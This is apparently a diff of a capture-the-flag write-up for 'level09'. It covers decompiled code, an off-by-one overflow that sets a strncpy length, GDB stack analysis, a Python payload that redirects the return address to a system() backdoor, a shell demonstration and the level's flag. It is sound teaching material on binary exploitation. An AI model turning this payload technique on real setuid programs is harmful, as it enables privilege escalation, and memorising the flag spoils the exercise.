@@ -1,103 +1,277 @@
 
-=> We have a buffer of 140 bytes
-=> set_username() copy the first 41 bytes just after the buffer (buffer[140 + i])
-=> We need to run the program once to load the addresses (PIE protection)
 
-=> We can try to fill the first buffer
-=> we can't reach the ret addr of handle_msg with 41 bytes
+# level09
 
-=> We fill the first buffer (41 bytes at most) and it doesn't overwrite the ret of handle message
-0x7fffffffe5c0:	0x4141414141414141	0x4141414141414141
-0x7fffffffe5d0:	0x4141414141414141	0x4141414141414141
-0x7fffffffe5e0:	0x0000004141414141	0x00007fffffffe600
-0x7fffffffe5f0:	0x00007fffffffe600	0x0000555555554abd <- ret addr of handle_msg
+## General Informations 
 
-=> set_msg() copy a number of bytes to the buffer
-=> The number number of bytes copied with strncpy is a number at the address: (buffer + 180);
+**Path** : `/home/users/level09/level09` </br>
+**File** : 
+```
+level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09`  </br>
+**Protections**:
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   level09
+```
 
-=> We can access this value because set_username allow us to write until buffer[140 + 41]
-r < <(python -c 'print "A"*41 + "\n" + "B"*200')
+## Static Analysis
 
-=> We break just before the strncpy and we can see that the value 65 (A) is used by the rdx register, which is the number of bytes copied
+After decompiling the binary in ghidra, we get the pseudo code below: 
 
-   0x00005555555549c6 <+148>:	callq  0x555555554720 <strncpy@plt>
+```
+void secret_backdoor(void)
+{
+  char local_88 [128];
+  
+  fgets(local_88,0x80,_stdin);
+  system(local_88);
+  return;
+}
 
-Breakpoint 4, 0x00005555555549c6 in set_msg ()
-(gdb) i r
-rax            0x7fffffffe530	140737488348464
-rbx            0x0	0
-rcx            0x7fffffffe120	140737488347424
-rdx            0x41	65
+void set_msg(char *buffer)
+{
+  long lVar1;
+  char *pcVar2;
+  char buffer_msg [1024];
+  
+  pcVar2 = buffer_msg;
+  for (lVar1 = 0x80; lVar1 != 0; lVar1 = lVar1 + -1) {
+    pcVar2[0] = '\0';
+    pcVar2[1] = '\0';
+    pcVar2[2] = '\0';
+    pcVar2[3] = '\0';
+    pcVar2[4] = '\0';
+    pcVar2[5] = '\0';
+    pcVar2[6] = '\0';
+    pcVar2[7] = '\0';
+    pcVar2 = pcVar2 + 8;
+  }
+  puts(">: Msg @Unix-Dude");
+  printf(">>: ");
+  fgets(buffer_msg,0x400,_stdin);
+  strncpy(buffer,buffer_msg,(long)*(int *)(buffer + 0xb4));
+  return;
+}
 
-=> 65 bytes from the second input are copied in the buffer
-=> Let's modify this value by the maximum byte \xff (255)
+void set_username(long buffer)
+{
+  long lVar1;
+  char *pcVar2;
+  char buffer_username [140];
+  int local_c;
+  
+  pcVar2 = buffer_username;
+  for (lVar1 = 0x10; lVar1 != 0; lVar1 = lVar1 + -1) {
+    pcVar2[0] = '\0';
+    pcVar2[1] = '\0';
+    pcVar2[2] = '\0';
+    pcVar2[3] = '\0';
+    pcVar2[4] = '\0';
+    pcVar2[5] = '\0';
+    pcVar2[6] = '\0';
+    pcVar2[7] = '\0';
+    pcVar2 = pcVar2 + 8;
+  }
+  puts(">: Enter your username");
+  printf(">>: ");
+  fgets(buffer_username,0x80,_stdin);
+  for (local_c = 0; (local_c < 0x29 && (buffer_username[local_c] != '\0')); local_c = local_c + 1) {
+    *(char *)(buffer + 0x8c + (long)local_c) = buffer_username[local_c];
+  }
+  printf(">: Welcome, %s",buffer + 0x8c);
+  return;
+}
 
-0x7fffffffe5e0:	0x4242424242424242	0x4242424242424242
-0x7fffffffe5f0:	0x4242424242424242	0x000000000000000a <- ret addr handle_msg
+void handle_msg(void)
+{
+  undefined1 buffer [140];
+  undefined8 local_3c;
+  undefined8 local_34;
+  undefined8 local_2c;
+  undefined8 local_24;
+  undefined8 local_1c;
+  undefined4 local_14;
+  
+  local_3c = 0;
+  local_34 = 0;
+  local_2c = 0;
+  local_24 = 0;
+  local_1c = 0;
+  local_14 = 0x8c;
+  set_username(buffer);
+  set_msg(buffer);
+  puts(">: Msg sent!");
+  return;
+}
 
-Program received signal SIGSEGV, Segmentation fault.
-0x000000000000000a in ?? ()
+undefined8 main(void)
+{
+  puts(
+      "--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n- -------------------------------------------"
+      );
+  handle_msg();
+  return 0;
+}
+```
 
-=> We then have access to the ret addr of handle_msg
-=> We will overwrite this address by the address of secret_backdoor function
+- `main` calls `handle_msg`.
+- `handle_msg`:
+  - Allocates a buffer of 140 bytes.
+  - Calls `set_username`, passing this buffer.
+  - Then calls `set_msg`, passing the same buffer.
+- `set_username`:
+  - Prompts the user for a username and stores up to 128 bytes in a local buffer named `buffer_username`.
+  - Copies the first 41 bytes of `buffer_username` into the end of `handle_msg`'s buffer (`buffer + 140`).
+  - This results in a buffer overflow from `buffer + 140` to `buffer + 180`.
+- `set_msg`:
+  - Prompts the user for a message, storing it in a 1024 bytes buffer.
+  - Then copies a specific number of bytes from this message into `handle_msg`'s buffer using `strncpy`.
+  - The number of bytes copied is determined by the value stored at `buffer + 180`, a location that we control via the previous overflow in `set_username`.
+- `secret_backdoor`:
+  - Prompts for a command and executes it via system.
 
-(gdb) i function secret_backdoor
-0x000055555555488c  secret_backdoor
+## Vulnerability found  
 
-r < <(python -c 'print "A"*40 + "\xff\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')
+## Dynamic Analysis
 
-=> We have a segfault but the shell is executed and looks like to execute the "BBBB..." command
+We run the program and set two breakpoints:
+  - One in `set_username`, after the 41 bytes copy.
+  - A second in `set_msg`, after the call to `strncpy`.
+```
+(gdb) r
+(gdb) b *0x0000555555554aa1
+(gdb) b *0x00005555555549cb
+```
+
+Then we obeserve the stack and the program's behavior by filling the buffers:
+```
+(gdb) r < <(python -c 'print "A"*180 + "\n" + "B"*1024')
+```
+
+At the first breakpoint in `set_username`, we examine the stack:
+```
+(gdb) x/50xg $rsp 
+0x7fffffffe340:	0x00000001f7a2ca50	0x00007fffffffe3f0
+0x7fffffffe350:	0x4141414141414141	0x4141414141414141 <- buffer_username (180 bytes)
+0x7fffffffe360:	0x4141414141414141	0x4141414141414141
+0x7fffffffe370:	0x4141414141414141	0x4141414141414141
+0x7fffffffe380:	0x4141414141414141	0x4141414141414141
+0x7fffffffe390:	0x4141414141414141	0x4141414141414141
+0x7fffffffe3a0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe3b0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe3c0:	0x4141414141414141	0x0041414141414141
+0x7fffffffe3d0:	0x000000000000002d	0x00000029f7a945da
+0x7fffffffe3e0:	0x00007fffffffe4b0	0x0000555555554915
+0x7fffffffe3f0:	0x000000000000000a	0x0000555555554c69
+0x7fffffffe400:	0x00007ffff7ff7000	0x00007ffff7a94713
+0x7fffffffe410:	0x00007ffff7dd4260	0x00007ffff7dd4260
+0x7fffffffe420:	0x000000000000000a	0x00007ffff7ff7000
+0x7fffffffe430:	0x000000000000002d	0x00007ffff7a945da
+0x7fffffffe440:	0x0000000000000086	0x000000000000002d
+0x7fffffffe450:	0x000000000000000a	0x0000555555554c10
+0x7fffffffe460:	0x00007fffffffe5a0	0x00007ffff7a95d45
+0x7fffffffe470:	0x00007ffff7dd4260	0x41414141f7a9608f <- buffer + 140
+0x7fffffffe480:	0x4141414141414141	0x4141414141414141
+0x7fffffffe490:	0x4141414141414141	0x4141414141414141
+0x7fffffffe4a0:	0x0000004141414141	0x00007fffffffe4c0 <- buffer + 180
+0x7fffffffe4b0:	0x00007fffffffe4c0	0x0000555555554abd
+0x7fffffffe4c0:	0x0000000000000000	0x00007ffff7a3d7ed
+``` 
+
+The `buffer` starts at `0x7fffffffe47c - 140 = 0x7fffffffe3f0`. </br>
+
+Although the overflow doesn't immediately overwrite any return addresses, continuing to the second breakpoint in `set_msg`, we see that the `B` characters have been copied into buffer:
+
+```
+Breakpoint 2, 0x00005555555549cb in set_msg ()
+(gdb) x/50x 0x7fffffffe3f0
+0x7fffffffe3f0:	0x4242424242424242	0x4242424242424242
+0x7fffffffe400:	0x4242424242424242	0x4242424242424242
+0x7fffffffe410:	0x4242424242424242	0x4242424242424242
+0x7fffffffe420:	0x4242424242424242	0x4242424242424242
+0x7fffffffe430:	0x0000000000000042	0x00007ffff7a945da
+0x7fffffffe440:	0x0000000000000086	0x000000000000002d
+0x7fffffffe450:	0x000000000000000a	0x0000555555554c10
+0x7fffffffe460:	0x00007fffffffe5a0	0x00007ffff7a95d45
+0x7fffffffe470:	0x00007ffff7dd4260	0x41414141f7a9608f
+0x7fffffffe480:	0x4141414141414141	0x4141414141414141
+0x7fffffffe490:	0x4141414141414141	0x4141414141414141
+0x7fffffffe4a0:	0x0000004141414141	0x00007fffffffe4c0
+```
+
+We observe that 65 `B`s has been copied in the buffer. As supposed in the static analysis, the 41th character, wich is `A` (65) represent the number of characters to copy from `buffer_msg` to `handle_msg`'s buffer.
+
+```
+(gdb) x/b 0x7fffffffe3f0 + 180 
+0x7fffffffe4a4:	0x41
+```
+
+If we continue the execution  to `handle_msg` we can see that the return address of `handle_msg` is near: 
+```
+(gdb) x/50xg 0x7fffffffe3f0
 ...
+0x7fffffffe490:	0x4141414141414141	0x4141414141414141
+0x7fffffffe4a0:	0x0000004141414141	0x00007fffffffe4c0
+0x7fffffffe4b0:	0x00007fffffffe4c0	0x0000555555554abd < ret addr of handle_msg
+(gdb) x $rbp + 8
+0x7fffffffe4b8:	0x0000555555554abd
+```
+
+We calcul the padding necessary to overwrite this address:
+```
+(gdb) p/d 0x7fffffffe3f0 - 0x7fffffffe4b8
+$2 = -200
+```
+
+200 bytes are necessary to overwrite the return address of `handle_msg` from `buffer`. </br>
+We will replace the number of bytes located at `buffer + 180`, corresponding to the 41th character in `buffer_username`, to the value 208 `(0xd0)`. 
+```
+python -c 'print "A"*40 + "\xd0" + "\n" + "B"*1024'
+```
+
+Then we write 200 padding bytes and overwrite the return address of `handle_msg` with the address of `secret_backdoor`.:
+```
+python -c 'print "A"*40 + "\xd0" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'
+```
+
+Let's test it:
+```
+(gdb) r < <(python -c 'print "A"*40 + "\xd0" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')
 sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB: not found
+```
 
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000000000000 in ?? ()
+When executed, we see that the `system` call inside `secret_backdoor` is triggered, using the argument passed in `set_msg` (BB...).
 
--> It's because we have the NX protections enabled, just one command is executed
-(python -c 'print "A"*40 + "\xff\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
+## Payload construction 
 
----------------------------------------------------------------------------------
+First we send 40 filler bytes and a `0xd0` byte to set the copy length, allowing us to write 208 bytes:
+```
+python -c 'print "A"*40 + "\xd0" + "\n" + "B"*208'
+```
 
-1. Vulnerable Function: set_username
+Then, we craft the second input with 200 bytes of junk followed by the address of `secret_backdoor`.
+```
+python -c 'print "A"*40 + "\xd0" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'
+```
 
-	- The set_username function takes user input and writes it into the buffer user_data + 140.
+## Demonstration 
 
-	- By carefully crafting input, the value at user_data + 180 can be set to 0xff (255), which will later be used as the size for strncpy in set_msg.
+```
+level09@OverRide:~$ (python -c 'print "A"*40 + "\xd0" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"';cat ) | ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh
+whoami
+end
+```
 
-2. Vulnerable Function: set_msg
-
-	- In set_msg, the strncpy function copies data from message into user_data using the value stored at user_data + 180 as the length.
-
-	- If this value is manipulated to exceed the buffer size of user_data, it causes a buffer overflow, allowing control of the return address.
-
-3. Exploitation
-
-	- By overflowing the buffer in set_msg, the return address of the function can be overwritten with the address of secret_backdoor.
-
-	- Once secret_backdoor is executed, it allows the attacker to execute arbitrary commands, such as invoking /bin/sh.
-
-3. GDB
-
-	```bash
-	nm ./level09 | grep secret_backdoor
-	```
-	It will not work with PIE protection, you need to run gdb first and look addresses after
-
-	```bash
-	x/xg $rbp+8
-	x/100xg $rsp
-	```
-	```python
-	run < <(python -c 'print "A"*41 + "\n" + "B"*200 + ')
-	run < <(python -c 'print "\xff"*41 + "\n" + "\xcc"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')
-	```
-	- `"\xff"*41` : value of 255 for strncpy in the next input
-	- `"\n"`: next input
-	- `"\xcc"`: padding
-	- `"\x8c\x48\x55\x55\x55\x55\x00\x00"` : addresse of secret_backdoor
-
-4. Payload
-
-	```python
-	(python -c 'print "\xff"*41 + "\n" + "\xcc"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ; cat ) | ./level09
-	```
+## Flag 
+```
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+```
